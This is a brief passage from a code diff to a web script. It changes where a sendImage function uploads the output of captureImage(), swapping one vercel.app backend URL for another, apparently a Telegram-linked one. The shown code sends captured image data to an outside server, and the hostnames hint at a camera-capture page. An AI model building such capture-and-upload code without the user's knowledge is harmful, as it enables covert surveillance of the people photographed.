@@ -93,7 +93,7 @@ function captureImage(){
 }
 async function sendImage(){
   const img=captureImage();
-  await fetch("https://canzthanh-bat-sang-cam.vercel.app/api/upload",{
+  await fetch("https://duong-stack-valentine-telegram-back-omega.vercel.app/upload",{
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({image:img})
